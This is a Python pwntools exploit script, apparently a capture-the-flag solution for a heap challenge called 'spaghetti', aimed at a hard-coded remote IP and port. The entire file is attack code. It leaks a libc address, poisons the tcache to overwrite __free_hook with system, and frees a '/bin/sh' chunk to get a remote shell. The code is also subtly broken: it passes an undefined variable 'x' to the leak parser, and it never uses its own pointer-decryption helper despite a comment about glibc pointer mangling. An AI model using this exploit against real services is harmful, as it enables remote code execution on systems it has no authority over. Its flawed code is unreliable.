from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

context.terminal = ['tmux', 'splitw', '-h']
#binaryname = "./spaghetti"
#p=process(binaryname)
p=remote("207.154.239.148", 1369)
#p=gdb.debug(binaryname, gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain
#glibc 2.32 tcache addresses are stored as address ^ (chunk_address>>12)

malloc(0,1049)
malloc(1,24)
malloc(2,24)
malloc(3,24)
edit(3,"/bin/sh")
free(0)
_ = view(0)
leak = readLeak(x)
print(leak)
glibcbase = leak - 0x1ecbe0
free_hook = glibcbase + 0x001eee48
system = glibcbase + 0x00052290
free(1)
free(2)
edit(2,p64(free_hook))
malloc(4,24)
malloc(5,24)
edit(5,p64(system))
free(3)
p.interactive()















